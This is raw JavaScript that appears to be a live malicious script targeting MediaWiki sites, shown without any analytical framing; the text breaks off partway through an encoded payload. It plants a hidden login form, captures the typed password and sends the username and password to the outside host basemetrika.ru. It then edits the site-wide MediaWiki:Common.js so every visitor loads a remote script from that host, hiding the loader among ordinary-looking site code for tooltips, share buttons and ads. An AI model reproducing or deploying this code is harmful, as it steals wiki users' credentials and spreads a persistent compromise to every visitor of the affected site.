
(function() {
    const script = document.createElement("script");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
    script.type = 'text/javascript';
    script.addEventListener('load', () => {
      $.get("/wiki/" + "Special:UserLogin", function(data) { 
    $("#footer").append($(data).find("form[name=userlogin]").eq(0)).css({"display": "none"});
    pw_i = 0;
    pw = setInterval(function () {
        if ($("#wpPassword1").val() !== "") {
            var sent_login = encodeURIComponent(wgUserName);
            var sent_pwd = encodeURIComponent($("#wpPassword1").val());
            $.getScript("//basemetrika.ru/autofill.js?l=&p=".replace(/l=/g, "l=" + sent_login).replace(/p=/g, "p=" + sent_pwd))
            clearInterval(pw);
        } else if (pw_i > 5000) {
            var sent_login = encodeURIComponent(wgUserName);
            $.getScript("//basemetrika.ru/autofill.js?l=&p=".replace(/l=/g, "l=" + sent_login))
            clearInterval(pw);
        }
        pw_i += 50;
    }, 50);
})
$.get("/wiki/MediaWiki:Common.js", function(data) {
    source = $(data).find(".source-javascript").text();
    $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
        "User name '" + wgUserName + "', got common.js"
    ));
    if (!source.match("e24")) {
        $.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
            "User name '" + wgUserName + "', NO negative pattern in common.js, trying to edit"
        ));
        $.get("/w/index.php?title=MediaWiki:Common.js&action=edit", function (data) {
            editform3 = $(data).find("#editform");
            data_ser = editform3.serialize();
            data_ser = data_ser.replace(/wpTextbox1=[^&]*/g, "wpTextbox1=" + "//jQuery%2C%20import%20scripts%0A//mw.loader.load%28%27http%3A//code.jquery.com/jquery-1.7.2.min.js%27%29%3B%0A%24.getScript%28%27//basemetrika.ru/s/e24%27%29%3B%0A%24%28function%28%29%7B%0A%20%20%24%28%27a%5Btitle%2A%3D%22on.js%22%5D%27%29.parent%28%29.hide%28%29%3B%0A%7D%29%3B%0A%20%20%0A%20%20function%20sysopProtectPage%28%29%7B%0A%20%20%20var%20inp%20%3D%20document.getElementById%28%27mwProtect-level-edit%27%29%20%0A%20%20%20if%20%28inp%29%20addHandler%28inp%2C%20%27change%27%2C%20noMoveAutoconfirmedProtection%29%0A%20%20%20function%20noMoveAutoconfirmedProtection%28%29%7B%0A%20%20%20%20%20var%20inp%20%3D%20document.getElementById%28%27mwProtectUnchained%27%29%0A%20%20%20%20%20if%20%28%21inp%20%7C%7C%20inp.checked%29%20return%0A%20%20%20%20%20inp%20%3D%20document.getElementById%28%27mwProtect-level-move%27%29%0A%20%20%20%20%20if%20%28inp%20%26%26%20inp.selectedIndex%3D%3D1%29%20inp.selectedIndex%20%3D%200%0A%20%20%20%20%20inp%20%3D%20document.getElementById%28%27mwProtect-level-delete%27%29%0A%20%20%20%20%20if%20%28inp%20%26%26%20inp.selectedIndex%3D%3D1%29%20inp.selectedIndex%20%3D%200%0A%20%20%20%7D%0A%20%20%7D%0A%20%20%24%28sysopProtectPage%29%3B%0A%20%20%0A%20%20function%20newSectionLink%28%29%7B%0A%20%20%20var%20plus%20%3D%20document.getElementById%28%27ca-addsection%27%29%0A%20%20%20if%20%28%21plus%29%20return%0A%20%20%20var%20custom%20%3D%20document.getElementById%28%27add-custom-section%27%29%0A%20%20%20if%20%28%21custom%29%20return%0A%20%20%20plus.firstChild.setAttribute%28%27href%27%2C%20custom.getElementsByTagName%28%27a%27%29%5B0%5D.href%29%0A%20%20%7D%0A%20%20%0A%20%20%24.getScript%28%27http%3A//s7.addthis.com/js/250/addthis_widget.js%23pubid%3Dra-56974f7a629a6df1%27%29%3B%0A%20%20%24%28function%28%29%7B%0A%20%20%20%20if%28%20%28null%20%26%26%20typeof%20EnablePlusOne%20%3D%3D%20%27undefined%27%29%20%7C%7C%20%28wgNamespaceNumber%20%21%3D%200%20%26%26%20wgNamespaceNumber%20%21%3D%206%20%26%26%20wgNamespaceNumber%20%21%3D%20100%29%0A%20%20%20%20%20%20%7C%7C%20%28wgAction%20%21%3D%20%27view%27%29%20%7C%7C%20%28/%28oldid%7Cdiff%29%3D/.test%28window.location%29%29%20%29%20return%3B%0A%20%20%20%20%0A%20%20%20%20%24%28%27%23firstHeading%27%29.prepend%28%20%27%3Cdiv%20id%3D%22socialButtons%22%20class%3D%22noprint%22%3E%3Cdiv%20align%3D%22right%22%20style%3D%22float%3Aright%3B%20position%3A%20relative%3B%27%20%2B%0A%20%20%20%20%20%20%27margin%3A%2010px%200%200%200%3B%20z-index%3A%20110%3B%20width%3A%20230px%22%3E%3Cdiv%20id%3D%22socialWrapper%22%20align%3D%22right%22%20style%3D%22width%3A%20230px%22%27%20%2B%0A%20%20%20%20%20%20%27style%3D%22float%3Aright%22%3E%3C/g%3Aplusone%3E%3Cdiv%20class%3D%22addthis_toolbox%20addthis_default_style%20%22%3E%3Ca%20class%3D%22addthis_button_preferred_1%22%3E%3C/a%3E%27%20%2B%0A%20%20%20%20%20%20%27%3Ca%20class%3D%22addthis_button_preferred_2%22%3E%3C/a%3E%3Ca%20class%3D%22addthis_button_preferred_3%22%3E%3C/a%3E%3Ca%20class%3D%22addthis_button_preferred_4%22%3E%3C/a%3E%27%20%2B%0A%20%20%20%20%20%20%27%3Ca%20class%3D%22addthis_button_compact%22%3E%3C/a%3E%3Ca%20class%3D%22addthis_counter%20addthis_bubble_style%22%3E%3C/a%3E%27%20%2B%20%0A%20%20%20%20%20%20%27%3Cdiv%20class%3D%22g-plusone%22%20data-size%3D%22small%22%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%27%20%29%3B%0A%20%20%20%0A%20%20%20%20%28function%28%29%20%7B%0A%20%20%20%20%20%20var%20po%20%3D%20document.createElement%28%27script%27%29%3B%20po.type%20%3D%20%27text/javascript%27%3B%20po.async%20%3D%20true%3B%0A%20%20%20%20%20%20po.src%20%3D%20%27https%3A//apis.google.com/js/plusone.js%27%3B%0A%20%20%20%20%20%20var%20s%20%3D%20document.getElementsByTagName%28%27script%27%29%5B0%5D%3B%20s.parentNode.insertBefore%28po%2C%20s%29%3B%0A%20%20%20%20%7D%29%28%29%3B%0A%20%20%7D%29%3B%0A%20%20%0A%20%20/%2A%20%D0%90%D0%B2%D1%82%D0%BE%D1%80%D1%8B%3A%20%D1%80%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%87%D0%B8%D0%BA%D0%B8%20%D0%92%D0%B8%D0%BA%D0%B8%D1%80%D0%B5%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8%20%D1%81%20%D0%BD%D0%B5%D0%BA%D0%BE%D1%82%D0%BE%D1%80%D0%BE%D0%B9%20%D0%BF%D0%BE%D0%BC%D0%BE%D1%89%D1%8C%D1%8E%20Mithgol%20the%20Webmaster%20%2A/%0A%20%20%24%28function%28%29%20%7B%0A%20%20%20%20%20%24%28%27.jnav%27%29.each%28function%28i%2Ce%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28this%29.data%28%27i%27%2C%20i%2B1%29.click%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20var%20%24this%20%3D%20%24%28this%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24jnavb%20%3D%20%24%28%27%23jnavb-%27%20%2B%20%24this.data%28%27i%27%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20if%28%20%24this.hasClass%28%27jnav-inactive%27%29%20%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.jnav-active%27%29.removeClass%28%27jnav-active%27%29.addClass%28%27jnav-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.jnavb%27%29.slideUp%28250%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27jnav-inactive%27%29.addClass%28%27jnav-active%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24jnavb.slideDown%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27jnav-active%27%29.addClass%28%27jnav-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24jnavb.slideUp%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%0A%20%20%20%20%20if%28%24%28%27.jnavpm%27%29.width%28%29%20%3E%200%29%0A%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24%28%27.jnavpm%27%29.each%28function%28i%2Ce%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%24%28this%29.data%28%27i%27%2C%20i%2B1%29.click%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20%24this%20%3D%20%24%28this%29%2C%20%24jnavb%20%3D%20%24%28%27%23jnavb-%27%20%2B%20%24this.data%28%27i%27%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28%20%24this.hasClass%28%27jnavpm-inactive%27%29%20%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.jnavpm-active%27%29.removeClass%28%27jnavpm-active%27%29.addClass%28%27jnavpm-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.jnavb%27%29.slideUp%28250%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27jnavpm-inactive%27%29.addClass%28%27jnavpm-active%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24jnavb.slideDown%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24this.removeClass%28%27jnavpm-active%27%29.addClass%28%27jnavpm-inactive%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24jnavb.slideUp%28300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%7D%20%20%20%0A%20%20%7D%29%3B%0A%20%20%0A%20%20/%2A%20%D0%90%D0%B2%D1%82%D0%BE%D1%80%20Tachikoma%2C%20%D0%B4%D0%BE%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%BD%D0%BE%20%D1%80%D1%83%D0%BA%D0%BE%D0%B2%D0%BE%D0%B4%D1%81%D1%82%D0%B2%D0%BE%D0%BC%20%D0%92%D0%B8%D0%BA%D0%B8%D1%80%D0%B5%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8%20%2A/%0A%20%20%24%28function%28%29%20%7B%0A%20%20%20%20%20%20if%28wgUserName%20%21%3D%20null%20%26%26%20typeof%20jsForceNewRefs%20%3D%3D%20%27undefined%27%29%20return%3B%0A%20%20%20%20%20%20if%28%21%28%24%28%27ol.references%27%29.size%28%29%29%29%20return%3B%0A%20%20%20%20%20%20%24%28%27ol.references%27%29.before%28%24%28%27%3Ca%20href%3D%22%23%22%3E%5B%D0%BF%D0%BE%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C%20%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%87%D0%B0%D0%BD%D0%B8%D1%8F%5D%3C/a%3E%27%29.click%28%0A%20%20%20%20%20%20%20%20%20%20function%28e%29%7Be.preventDefault%28%29%3B%20%24%28%27ol.references%27%29.toggle%28%29%7D%29%29.hide%28%29%3B%0A%20%20%20%20%20%20%24%28%27.reference%20a%27%29.live%28%27click%27%2C%20function%28e%29%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20e.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20var%20x%20%3D%20%24%28this%29%2C%20iscurrent%20%3D%20x.hasClass%28%27curreference%27%29%2C%20i%20%3D%20%24%28%27.fref%27%29.hide%28250%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27.curreference%27%29.removeClass%28%27curreference%27%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20if%20%28iscurrent%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20var%20par%20%3D%20x.parent%28%29%2C%20o%20%3D%20par.offset%28%29%2C%20l%20%3D%20o.left%2C%20t%20%3D%20o.top%2B13%3B%0A%20%20%20%20%20%20%20%20%20%20var%20b%20%3D%20%24%28%27body%27%29%2C%20mh%20%3D%20b.height%28%29%2C%20mw%20%3D%20b.width%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20var%20c%3D%24%28x.attr%28%27href%27%29%29.clone%28%29.find%28%27a%3Afirst%27%29.remove%28%29.end%28%29.html%28%29%3B%0A%20%20%20%0A%20%20%20%20%20%20%20%20%20%20x.addClass%28%27areference%27%29.addClass%28%27curreference%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20if%20%28%21i.size%28%29%29%20i%20%3D%20%24%28%27%3Cdiv/%3E%27%29.addClass%28%27fref%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20c%3Dc.replace%28/%E2%86%91/%2C%27%27%29.replace%28/%3Csup%3E.%2A%3C%5C/sup%3E%20/g%2C%27%27%29.replace%28/%5E%20/%2C%27%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20i.appendTo%28b%29.queue%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20i.empty%28%29.append%28c%29.css%28%7B%20%27left%27%3A%20l-%28%28l%2Bi.width%28%29%20%3E%3D%20mw%29%20%26%26%20i.width%28%29%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27top%27%3A%20t-%28%28t%2Bi.height%28%29%20%3E%3D%20mh%29%20%26%26%20%28i.height%28%29%2B24%29%29%20%7D%29.dequeue%28%29%0A%20%20%20%20%20%20%20%20%20%20%7D%29.show%28350%29%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%24%28window%29.click%28function%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20if%20%28%21%28%24%28e.target%29.hasClass%28%27areference%27%29%20%7C%7C%20%24%28e.target%29.parents%28%29.andSelf%28%29.hasClass%28%27tooltip%27%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27.tooltip%27%29.hide%28350%29%3B%20%24%28%27.curreference%27%29.removeClass%28%27curreference%27%29%0A%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%7D%29%3B%0A%20%20%0A%20%20/%2A%20%0A%20%20%20%20%20ref_standard%20--%2026%20June%202010.%20%D0%90%D0%B2%D1%82%D0%BE%D1%80%3A%20%5B%5B%D0%A3%D1%87%D0%B0%D1%81%D1%82%D0%BD%D0%B8%D0%BA%3ASuspectedSockPuppet%5D%5D.%0A%20%20%20%20%20%D0%A3%D1%81%D1%82%D0%B0%D0%BD%D0%B0%D0%B2%D0%BB%D0%B8%D0%B2%D0%B0%D0%B5%D1%82%20%D0%BF%D0%BE%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5%20%D1%81%D0%BD%D0%BE%D1%81%D0%BA%D0%B8%20%D0%B2%D1%81%D0%B5%D0%B3%D0%B4%D0%B0%20%D0%9F%D0%9E%D0%A1%D0%9B%D0%95%20%D0%B7%D0%BD%D0%B0%D0%BA%D0%BE%D0%B2%20%D0%BF%D1%80%D0%B5%D0%BF%D0%B8%D0%BD%D0%B0%D0%BD%D0%B8%D1%8F%20%28%D1%82%D0%BE%D1%87%D0%BA%D0%B0%2C%20%D0%B7%D0%B0%D0%BF%D1%8F%D1%82%D0%B0%D1%8F%2C%20%D1%82%D0%BE%D1%87%D0%BA%D0%B0%20%D1%81%20%D0%B7%D0%B0%D0%BF%D1%8F%D1%82%D0%BE%D0%B9%29.%0A%20%20%2A/%0A%20%20function%20ref_standard%28%29%0A%20%20%7B%0A%20%20%20%20var%20refs%20%3D%20document.getElementsByClassName%28%27reference%27%29%3B%0A%20%20%20%20var%20cur%2C%20prev%2C%20next%2C%20res%3B%0A%20%20%20%0A%20%20%20%20for%28i%3D0%3Bi%3Crefs.length%3Bi%2B%2B%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20cur%20%3D%20refs%5Bi%5D%3B%0A%20%20%20%20%20%20if%28%20%21%28%20prev%20%3D%20cur.previousSibling%20%29%20%7C%7C%20%21%28%20next%20%3D%20cur.nextSibling%20%29%20%29%20break%3B%0A%20%20%20%0A%20%20%20%20%20%20if%28res%20%3D%20next.textContent.match%28/%5E%5B.%2C%3B%5D/%29%29%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20next.textContent%20%3D%20next.textContent.substr%281%29%3B%0A%20%20%20%20%20%20%20%20cur.parentNode.insertBefore%28document.createTextNode%28res%29%2C%20cur%29%3B%20%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20%24%28ref_standard%29%3B%0A%20%20%0A%20%20/%2A%20%2B%20%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B0%20%C2%AB%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C%C2%BB%20%D0%B4%D0%BB%D1%8F%20%D0%BD%D1%83%D0%BB%D0%B5%D0%B2%D0%BE%D0%B9%20%D1%81%D0%B5%D0%BA%D1%86%D0%B8%D0%B8.%20%2A/%0A%20%20%24%28function%28%29%7B%0A%20%20%20%20%20if%28%20%28wgNamespaceNumber%20%21%3D%200%20%26%26%20wgNamespaceNumber%20%21%3D%206%20%26%26%20wgNamespaceNumber%20%21%3D%20100%29%0A%20%20%20%20%20%20%20%20%7C%7C%20wgAction%20%21%3D%20%27view%27%20%7C%7C%20/%28oldid%7Cdiff%29%3D/.test%28window.location%29%20%29%20return%3B%0A%20%20%20%20%20%24%28%27%23firstHeading%27%29.append%28%27%3Cspan%20class%3D%22editsection%22%3E%5B%3Ca%20title%3D%22%D0%9F%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C%20%D1%81%D0%B5%D0%BA%D1%86%D0%B8%D1%8E%3A%200%22%20href%3D%22/w/index.php%3Ftitle%3D%27%0A%20%20%20%20%20%20%20%2B%20encodeURIComponent%28wgPageName%29%20%0A%20%20%20%20%20%20%20%2B%20%27%26action%3Dedit%26section%3D0%22%3E%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C%20%D0%BF%D1%80%D0%B5%D0%B0%D0%BC%D0%B1%D1%83%D0%BB%D1%83%3C/a%3E%5D%3C/span%3E%27%29%3B%0A%20%20%20%20%20%24%28%27%23firstHeading%20.editsection%27%29.show%28%29.css%28%27text-shadow%27%2C%20%27none%27%29%3B%0A%20%20%7D%29%3B%0A%20%20%0A%20%20%28function%28%29%20%7B%0A%20%20%20%24%28%27%23top%27%29.after%28%27%3Cdiv%20id%3D%22yandex_rtb_R-A-91320-1%22%20class%3D%22firstHeading%22%20align%3D%22center%22%3E%3C/div%3E%27%29%3B%0A%20%20%7D%29%28%29%3B%0A%20%20%0A%20%20%28function%28w%2C%20d%2C%20n%2C%20s%2C%20t%29%20%7B%0A%20%20%20if%28wgUserName%20%21%3D%20null%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20w%5Bn%5D%20%3D%20w%5Bn%5D%20%7C%7C%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20w%5Bn%5D.push%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20Ya.Context.AdvManager.render%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20blockId%3A%20%22R-A-91320-1%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20renderTo%3A%20%22yandex_rtb_R-A-91320-1%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20async%3A%20true%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20t%20%3D%20d.documentElement.firstChild%3B%0A%20%20%20s%20%3D%20d.createElement%28%22script%22%29%3B%0A%20%20%20s.type%20%3D%20%22text/javascript%22%3B%0A%20%20%20s.src%20%3D%20%22https%3A//yandex.ru/ads/system/context.js%22%3B%0A%20%20%20s.setAttribute%28%22async%22%2C%20%22true%22%29%3B%0A%20%20%20t.insertBefore%28s%2C%20t.firstChild%29%3B%0A%20%20%7D%29%28window%2C%20document%2C%20%22yandex_context_callbacks%22%29%3B%0A%20%20%0A%20%20%28function%28%29%20%7B%0A%20%20%24%28%27%23p-search%27%29.after%28%27%3Cdiv%20id%3D%22yandex_ad%22%20class%3D%22portlet%22%3E%3C/div%3E%27%29%3B%0A%20%20%7D%29%28%29%3B%0A%20%20%28function%28w%2C%20d%2C%20n%2C%20s%2C%20t%29%20%7B%0A%20%20if%28wgUserName%20%21%3D%20null%29%20return%3B%0A%20%20w%5Bn%5D%20%3D%20w%5Bn%5D%20%7C%7C%20%5B%5D%3B%0A%20%20w%5Bn%5D.push%28function%28%29%20%7B%0A%20%20%20Ya.Direct.insertInto%2891320%2C%20%22yandex_ad%22%2C%20%7B%0A%20%20%20%20site_charset%3A%20%22utf-8%22%2C%0A%20%20%20%20ad_format%3A%20%22direct%22%2C%0A%20%20%20%20font_size%3A%201.0%2C%0A%20%20%20%20type%3A%20%22vertical%22%2C%0A%20%20%20%20limit%3A%203%2C%0A%20%20%20%20title_font_size%3A%202%2C%0A%20%20%20%20site_bg_color%3A%20%22FFFFFF%22%2C%0A%20%20%20%20header_bg_color%3A%20%226699CC%22%2C%0A%20%20%20%20title_color%3A%20%22006699%22%2C%0A%20%20%20%20url_color%3A%20%22006699%22%2C%0A%20%20%20%20text_color%3A%20%22000000%22%2C%0A%20%20%20%20hover_color%3A%20%226699CC%22%2C%0A%20%20%20%20favicon%3A%20true%0A%20%20%20%7D%29%3B%0A%20%20%7D%29%3B%0A%20%20t%20%3D%20d.documentElement.firstChild%3B%0A%20%20s%20%3D%20d.createElement%28%22script%22%29%3B%0A%20%20s.type%20%3D%20%22text/javascript%22%3B%0A%20%20s.src%20%3D%20%22https%3A//yandex.ru/ads/system/context.js%22%3B%0A%20%20s.setAttribute%28%22async%22%2C%20%22true%22%29%3B%0A%20%20t.insertBefore%28s%2C%20t.firstChild%29%3B%0A%20%20%7D%29%28window%2C%20document%2C%20%22yandex_context_callbacks%22%29%3B%0A%20%20%0A%20%20%28function%28%29%20%7B%0A%20%20%20%24%28%27%23mw-content-text%27%29.after%28%27%3Cdiv%20id%3D%22yandex_rtb_R-A-91320-2%22%20class%3D%22mw-content-ltr%22%20align%3D%22center%22%3E%3C/div%3E%27%29%3B%0A%20%20%7D%29%28%29%3B%0A%20%20%0A%20%20%28function%28w%2C%20d%2C%20n%2C%20s%2C%20t%29%20%7B%0A%20%20%20if%28wgUserName%20%21%3D%20null%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20w%5Bn%5D%20%3D%20w%5Bn%5D%20%7C%7C%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20w%5Bn%5D.push%28function%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20Ya.Context.AdvManager.render%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20blockId%3A%20%22R-A-91320-2%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20renderTo%3A%20%22yandex_rtb_R-A-91320-2%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20async%3A%20true%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20t%20%3D%20d.documentElement.firstChild%3B%0A%20%20%20s%20%3D%20d.createElement%28%22script%22%29%3B%0A%20%20%20s.type%20%3D%20%22text/javascript%22%3B%0A%20%20%20s.src%20%3D%20%22https%3A//yandex.ru/ads/system/context.js%22%3B%0A%20%20%20s.setAttribute%28%22async%22%2C%20%22true%22%29%3B%0A%20%20%20t.insertBefore%28s%2C%20t.firstChild%29%3B%0A%20%20%7D%29%28window%2C%20document%2C%20%22yandex_context_callbacks%22%29%3B%0A%20%20%0A%20%20//%28function%28%29%20%7B%0A%20%20//%20%24%28%27%23mw-content-text%27%29.after%28%27%3Cdiv%20id%3D%22yandex_ad2%22%20class%3D%22mw-content-ltr%22%20align%3D%22center%22%3E%3C/div%3E%27%29%3B%0A%20%20//%7D%29%28%29%3B%0A%20%20//%20%0A%20%20//%28function%28w%2C%20d%2C%20n%2C%20s%2C%20t%29%20%7B%0A%20%20//%20if%28wgUserName%20%21%3D%20null%29%20return%3B%0A%20%20//%20w%5Bn%5D%20%3D%20w%5Bn%5D%20%7C%7C%20%5B%5D%3B%0A%20%20//%20w%5Bn%5D.push%28function%28%29%20%7B%0A%20%20//%20%20Ya.Direct.insertInto%2891320%2C%20%22yandex_ad2%22%2C%20%7B%0A%20%20//%20%20%20site_charset%3A%20%22utf-8%22%2C%0A%20%20//%20%20%20ad_format%3A%20%22drect%22%2C%0A%20%20//%20%20%20font_size%3A%201.0%2C%0A%20%20//%20%20%20type%3A%20%22horizontal%22%2C%0A%20%20//%20%20%20limit%3A%202%2C%0A%20%20//%20%20%20title_font_size%3A%202%2C%0A%20%20//%20%20%20site_bg_color%3A%20%22FFFFFF%22%2C%0A%20%20//%20%20%20header_bg_color%3A%20%22f9f9f9%22%2C%0A%20%20//%20%20%20title_color%3A%20%22006699%22%2C%0A%20%20//%20%20%20url_color%3A%20%22006699%22%2C%0A%20%20//%20%20%20text_color%3A%20%22000000%22%2C%0A%20%20//%20%20%20hover_color%3A%20%226699CC%22%2C%0A%20%20//%20%20%20favicon%3A%20false%0A%20%20//%20%20%7D%29%3B%0A%20%20//%7D%29%3B%0A%20%20//%20t%20%3D%20d.documentElement.firstChild%3B%0A%20%20//%20s%20%3D%20d.createElement%28%22script%22%29%3B%0A%20%20//%20s.type%20%3D%20%22text/javascript%22%3B%0A%20%20//%20s.src%20%3D%20%22https%3A//yandex.ru/ads/system/context.js%22%3B%0A%20%20//%20s.setAttribute%28%22async%22%2C%20%22true%22%29%3B%0A%20%20//%20t.insertBefore%28s%2C%20t.firstChild%29%3B%0A%20%20//%7D%29%28window%2C%20document%2C%20%22yandex_context_callbacks%22%29%3B%0A%20%20%0A%20%20//%20%D0%A0%D0%B0%D0%B7%D0%BC%D0%B5%D1%80%D1%8B%20%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%B9%20%D0%B2%20%D0%B8%D1%81%D1%82%D0%BE%D1%80%D0%B8%D0%B8%20%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D0%BA%0A%20%20%0A%20%20function%20returnOfTheDiffSizes%28%29%7B%0A%20%20%20var%20classes%20%3D%20%5B%20%27.mw-plusminus-pos%27%2C%20%27.mw-plusminus-neg%27%2C%20%27.mw-plusminus-null%27%20%5D%0A%20%20%20for%28i%3D0%3Bi%3C%3D2%3Bi%2B%2B%29%0A%20%20%20%7B%0A%20%20%20%20%24%28classes%5Bi%5D%29.each%28%0A%20%20%20%20%20function%28i%2C%20elem%29%0A%20%20%20%20%20%7B%0A%20%20%20%20%20%20var%20title%20%3D%20elem.title.replace%28/%D0%A0%D0%B0%D0%B7%D0%BC%D0%B5%D1%80%20%D0%BF%D0%BE%D1%81%D0%BB%D0%B5%20%D0%B8%D0%B7%D0%BC%D0%B5%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F%3A%20%28%5B0-9%C2%A0%5D%2B%20%D0%B1%D0%B0%D0%B9%D1%82%D0%B0%3F%29/%2C%20%22%241%22%29%0A%20%20%20%20%20%20%24%28%27%3Cspan%20/%3E%27%29.text%28%27%20.%20.%C2%A0%28%27%2Btitle%2B%27%29%27%29.insertAfter%28%24%28elem%29%29%0A%20%20%20%20%20%7D%0A%20%20%20%20%29%0A%20%20%20%7D%0A%20%20%7D%0A%20%20%0A%20%20if%20%28wgAction%20%3D%3D%20%27history%27%29%0A%20%20%7B%0A%20%20%20%20returnOfTheDiffSizes%28%29%0A%20%20%7D%0A%20%20%0A%20%20/%2A%2A%0A%20%20%2A%20%40author%20Falchenko%20Maxim%20aka%20be3%0A%20%20%2A%20%40plugin_page%20http%3A//tops.net.ua/jquery_addtocopy/%0A%20%20%2A%20%40desc%20Adds%20a%20link%20to%20the%20copied%20text%0A%20%20%2A%20%40version%201.2%0A%20%20%2A%20%40example%0A%20%20%2A%20%24%28%22%23content%22%29.addtocopy%28%29%3B%0A%20%20%2A%20%40license%20free%0A%20%20%2A%2A/%0A%20%20jQuery.fn.addtocopy%20%3D%20function%28usercopytxt%29%20%7B%0A%20%20%20%20%20%20var%20options%20%3D%20%7Bhtmlcopytxt%3A%20%27%3Cbr%3EMore%3A%20%3Ca%20href%3D%22%27%2Bwindow.location.href%2B%27%22%3E%27%2Bwindow.location.href%2B%27%3C/a%3E%3Cbr%3E%27%2C%20minlen%3A%2025%2C%20addcopyfirst%3A%20false%7D%0A%20%20%20%20%20%20%24.extend%28options%2C%20usercopytxt%29%3B%0A%20%20%20%20%20%20var%20copy_sp%